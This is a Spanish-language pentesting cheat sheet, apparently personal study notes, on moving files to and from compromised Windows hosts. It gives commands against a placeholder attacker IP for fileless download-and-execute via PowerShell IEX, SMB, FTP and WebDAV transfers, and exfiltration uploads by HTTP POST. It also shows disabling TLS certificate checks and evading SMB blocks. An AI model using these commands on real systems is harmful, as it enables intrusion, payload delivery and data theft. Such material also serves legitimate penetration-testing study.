---
tags:
  - filetransfer
  - windows
---
## Conceptos Clave (TL;DR)

* El sistema operativo Windows posee utilidades nativas (Living Off The Land) que atacantes y defensores deben conocer para las operaciones de transferencia de archivos.
* Las amenazas "fileless" utilizan estas herramientas nativas para ejecutar código directamente en memoria sin necesidad de dejar un archivo físico en el disco, aunque la transferencia de datos a través de la red sigue ocurriendo.
* El uso de sumas de comprobación MD5 es indispensable para verificar la integridad de los archivos transferidos o codificados, asegurando que coincidan exactamente en el origen y en el destino.

  
## Herramientas Clave

* **PowerShell (Net.WebClient, Invoke-WebRequest, IEX):** Descarga de archivos a disco o ejecución de código directamente en memoria.
* **Impacket (smbserver.py):** Levantamiento rápido de un servidor SMB en el host atacante para servir o recibir archivos.
* **[python](../../../📂%2008%20Herramientas&Cheatsheets/python.md) (pyftpdlib, uploadserver, wsgidav):** Módulos para crear servidores FTP, HTTP con capacidad de subida, y WebDAV respectivamente.
* **Windows CMD (copy, ftp):** Utilidades integradas de Windows para mover archivos vía SMB o descargar/subir por FTP.
* **md5sum / Get-FileHash:** Verificación criptográfica de la integridad de los binarios transferidos.

  
## Metodología Paso a Paso

**Fase 1: Preparación del Entorno (Atacante)**
Identifica las restricciones de red (puertos permitidos). Levanta un servidor acorde en la máquina atacante (SMB en 445, FTP en 21, HTTP Upload en 8000, o WebDAV en 80) para alojar o recibir el payload.


**Fase 2: Transferencias Offline (Codificación Base64)**
Si no existe comunicación de red directa, codifica el binario en Base64 en el origen, copia el texto resultante a través del portapapeles de la terminal y decodifícalo en el destino.

  
**Fase 3: Operaciones de Descarga (Hacia el Target)**
Utiliza clientes nativos de Windows (PowerShell, CMD, ftp) para traer el archivo desde tu servidor. Opta por protocolos permitidos por el firewall corporativo (comúnmente HTTP/HTTPS por los puertos 80/443).

  
**Fase 4: Ejecución Fileless (Opcional)**
Para evasión de disco, concatena la descarga web en PowerShell directamente con el cmdlet Invoke-Expression (IEX) para ejecutar el payload exclusivamente en memoria.

  
**Fase 5: Operaciones de Subida (Desde el Target)**
Para exfiltración o transferencia de herramientas, configura un servidor que acepte escritura (FTP con flag write, Python uploadserver, WebDAV o SMB) y envía los datos desde Windows usando peticiones POST, clientes FTP o copias a recursos compartidos.


## Cheat Sheet de Comandos

### Verificación de Integridad (MD5)
```bash
# Calcular MD5 en Linux
md5sum <FILE>
```

```powershell
# Calcular MD5 en Windows
Get-FileHash <FILE_PATH> -Algorithm md5
```

### Transferencias vía Base64 (Sin Red)
```bash
# Codificar archivo a Base64 en Linux (remover saltos de línea)
cat <FILE> | base64 -w 0; echo
```

```powershell
# Decodificar Base64 y guardar en disco en Windows
[IO.File]::WriteAllBytes("<OUTPUT_FILE_PATH>", [Convert]::FromBase64String("<BASE64_STRING>"))
 

# Codificar archivo a Base64 en Windows
[Convert]::ToBase64String((Get-Content -path "<FILE_PATH>" -Encoding byte))
```

```bash
# Decodificar Base64 y guardar en disco en Linux

echo <BASE64_STRING> | base64 -d > <OUTPUT_FILE>
```

### Descargas Web con PowerShell
```powershell
# Descargar archivo a disco usando Net.WebClient
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>/<FILE>', '<OUTPUT_FILE_PATH>')

  
# Descargar archivo a disco usando Invoke-WebRequest (iwr)
Invoke-WebRequest http://<ATTACKER_IP>/<FILE> -OutFile <OUTPUT_FILE_PATH>

  
# Fileless: Descargar y ejecutar script directo en memoria usando IEX
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/<SCRIPT_FILE>')
```

### Transferencias vía SMB
```bash
# Iniciar servidor SMB anónimo en Linux (Impacket)
sudo impacket-smbserver share -smb2support <DIRECTORY_PATH>

  
# Iniciar servidor SMB con credenciales en Linux (Evita bloqueos de guest access)
sudo impacket-smbserver share -smb2support <DIRECTORY_PATH> -user <USERNAME> -password <PASSWORD>
```

```cmd
# Descargar archivo desde SMB (Anónimo)
copy \\<ATTACKER_IP>\share\<FILE>

  
# Montar recurso SMB con credenciales en Windows y copiar
net use n: \\<ATTACKER_IP>\share /user:<USERNAME> <PASSWORD>
copy n:\<FILE>
```

### Transferencias vía FTP
```bash
# Iniciar servidor FTP en Linux (Puerto 21, acceso anónimo, permisos de escritura habilitados)

sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
# Descargar archivo vía FTP usando PowerShell

(New-Object Net.WebClient).DownloadFile('ftp://<ATTACKER_IP>/<FILE>', '<OUTPUT_FILE_PATH>')
 

# Subir archivo vía FTP usando PowerShell
(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/<FILE>', '<FILE_PATH_TO_UPLOAD>')
```

```cmd
# Scripting de cliente FTP nativo de CMD (Útil en shells no interactivas para descargar/subir)

echo open <ATTACKER_IP> > ftpcommand.txt

echo USER anonymous >> ftpcommand.txt

echo binary >> ftpcommand.txt

echo GET <FILE_TO_DOWNLOAD> >> ftpcommand.txt

echo bye >> ftpcommand.txt

ftp -v -n -s:ftpcommand.txt
```

### Subidas Web (HTTP POST y WebDAV)
```bash
# Iniciar servidor de subida web en Linux (Python uploadserver)

pip3 install uploadserver

python3 -m uploadserver
```

```powershell
# Subir archivo al uploadserver de Python usando Invoke-RestMethod (Requiere script PSUpload.ps1 cargado previamente en memoria)
Invoke-FileUpload -Uri http://<ATTACKER_IP>:8000/upload -File <FILE_PATH>

  
# Subir archivo codificado en Base64 mediante POST HTTP
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE_PATH>' -Encoding Byte))

Invoke-WebRequest -Uri http://<ATTACKER_IP>:<PORT>/ -Method POST -Body $b64
```

```bash
# Iniciar servidor WebDAV en Linux (Útil para bypassear filtros SMB)

sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=<DIRECTORY_PATH> --auth=anonymous
```

```cmd
# Subir archivo a WebDAV usando la palabra reservada DavWWWRoot en Windows

copy <FILE_PATH> \\<ATTACKER_IP>\DavWWWRoot\
```

## "Gotchas" y Troubleshooting

* **Limitaciones de longitud Base64:** La utilidad de línea de comandos de Windows (cmd.exe) posee un límite de 8,191 caracteres, y las web shells pueden fallar si se envían cadenas excesivamente grandes.

* **Error del First-Launch de Internet Explorer:** Al usar `Invoke-WebRequest`, si Internet Explorer nunca fue configurado, arrojará error. Usa la bandera `-UseBasicParsing` para omitir el motor de IE.

* **Error de Certificado SSL/TLS:** Si la conexión HTTPS falla por certificados no confiables en PowerShell, ejecuta `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}` antes de descargar.

* **Bloqueos de Tráfico SMB (445):** Comúnmente el tráfico saliente por el puerto TCP/445 es bloqueado por firewalls corporativos. La alternativa es usar WebDAV, ya que si falla SMB, Windows intentará conectarse mediante HTTP (puerto 80).

* **Bloqueo a Guest Access en SMB:** Nuevas versiones de Windows bloquean el acceso anónimo (guest) no autenticado por SMB. Resuélvelo asignando un usuario y contraseña en Impacket y montando el recurso compartido con `net use`.

* **WebDAV Dir/Folder routing:** La palabra clave `DavWWWRoot` es reconocida por el Mini-Redirector driver del Shell de Windows para apuntar directo a la raíz del servidor WebDAV sin necesidad de que exista una carpeta con ese nombre.